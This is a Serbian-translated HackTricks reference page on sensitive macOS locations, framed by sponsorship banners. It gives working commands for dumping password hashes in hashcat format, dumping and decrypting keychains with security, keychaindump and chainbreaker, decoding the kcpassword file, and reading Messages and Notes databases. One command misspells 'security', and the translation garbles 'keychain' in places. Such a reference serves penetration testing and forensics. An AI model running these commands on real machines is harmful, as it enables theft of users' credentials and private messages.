# macOS Sensitive Locations

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Lozinke

### Senke lozinki

Senka lozinke se čuva sa korisničkom konfiguracijom u plistovima smeštenim u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može se koristiti za ispis **svih informacija o korisnicima** (uključujući informacije o hešu):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za pretvaranje heša u **hashcat** **format**.

Alternativna jednolinijska komanda koja će izbaciti akreditive svih korisničkih naloga koji nisu servisni u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Dumpovanje Keychain-a

Imajte na umu da prilikom korišćenja security binarnog fajla za **dumpovanje dešifrovanih lozinki**, korisnik će biti upitan da dozvoli ovu operaciju.

```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Na osnovu ovog komentara [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) izgleda da ovi alati više ne funkcionišu u Big Sur-u.
{% endhint %}

### Pregled Keychaindump-a

Razvijen je alat pod nazivom **keychaindump** koji služi za izvlačenje lozinki iz macOS keychain-a, ali ima ograničenja na novijim verzijama macOS-a kao što je Big Sur, kako je navedeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump**-a zahteva da napadač stekne pristup i privilegije **root**-a. Alat iskorišćava činjenicu da je keychain automatski otključan prilikom prijave korisnika radi praktičnosti, omogućavajući aplikacijama da mu pristupe bez ponovnog unošenja korisnikove lozinke. Međutim, ako korisnik odluči da zaključa svoj keychain nakon svake upotrebe, **keychaindump** postaje neefikasan.

**Keychaindump** funkcioniše tako što cilja određeni proces nazvan **securityd**, koji je opisan od strane Apple-a kao daemon za autorizaciju i kriptografske operacije, ključne za pristup keychain-u. Proces izvlačenja uključuje identifikaciju **Master Key**-a koji se dobija iz korisnikove prijavne lozinke. Ovaj ključ je neophodan za čitanje keychain fajla. Da bi pronašao **Master Key**, **keychaindump** skenira memoriju heap-a **securityd**-a koristeći `vmmap` komandu, tražeći potencijalne ključeve unutar područja označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za inspekciju ovih memorijskih lokacija:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Nakon identifikovanja potencijalnih glavnih ključeva, **keychaindump** pretražuje hrpe za određeni obrazac (`0x0000000000000018`) koji ukazuje na kandidata za glavni ključ. Dalji koraci, uključujući deobfuskaciju, su potrebni da bi se iskoristio ovaj ključ, kako je opisano u izvornom kodu **keychaindump**-a. Analitičari koji se fokusiraju na ovu oblast trebaju da primete da su ključni podaci za dešifrovanje keychain-a smešteni unutar memorije procesa **securityd**. Primer komande za pokretanje **keychaindump**-a je:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može se koristiti za izvlačenje sledećih vrsta informacija iz OSX keychain-a na forenzički ispravan način:

* Hashovana lozinka Keychain-a, pogodna za pucanje pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
* Internet lozinke
* Generičke lozinke
* Privatni ključevi
* Javni ključevi
* X509 sertifikati
* Bezbedne beleške
* Appleshare lozinke

Uz lozinku za otključavanje Keychain-a, master ključ dobijen korišćenjem [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili fajl za otključavanje kao što je SystemKey, Chainbreaker će takođe pružiti lozinke u plaintext-u.

Bez jednog od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.

#### **Dumpuj ključeve Keychain-a**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Ispumpaj ključeve keša (sa lozinkama) pomoću SystemKey**

```bash
/System/Library/Security/SecurityAgentPlugins/SystemKeychain.bundle/Contents/Resources/KeychainCLI -k /Library/Keychains/System.keychain -d
```

Ovaj komanda se koristi za ispuštanje ključeva keša (uključujući lozinke) pomoću SystemKey alata. Alat se nalazi na putanji `/System/Library/Security/SecurityAgentPlugins/SystemKeychain.bundle/Contents/Resources/KeychainCLI`, a keš se nalazi na putanji `/Library/Keychains/System.keychain`.

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Ispumpaj ključeve keša (sa lozinkama) krekovanjem heša**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Ispumpaj ključeve keša (sa lozinkama) pomoću ispumpavanja memorije**

[Pratite ove korake](../#ispumpavanje-memorije-pomoću-osxpmem) da biste izvršili **ispumpavanje memorije**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Ispumpaj ključeve keša (sa lozinkama) koristeći korisnikovu lozinku**

Ako znate korisnikovu lozinku, možete je koristiti da **ispumpate i dešifrujete kešove koji pripadaju korisniku**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### kcpassword

Datoteka **kcpassword** je datoteka koja čuva **korisničku lozinku za prijavu**, ali samo ako vlasnik sistema ima **omogućenu automatsku prijavu**. Zbog toga će korisnik automatski biti prijavljen bez traženja lozinke (što nije baš sigurno).

Lozinka je sačuvana u datoteci **`/etc/kcpassword`** kriptovana sa ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je korisnička lozinka duža od ključa, ključ će biti ponovno korišćen.\
To čini lozinku prilično lako povratiti, na primer korišćenjem skripti kao što je [**ova**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesantne informacije u bazama podataka

### Poruke

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Obaveštenja

Podatke o obaveštenjima možete pronaći u `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Većina interesantnih informacija će biti u **blob**-u. Dakle, moraćete da **izdvojite** taj sadržaj i **preoblikujete** ga u **čitljiv** oblik ili koristite **`strings`**. Da biste pristupili tome, možete uraditi sledeće:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
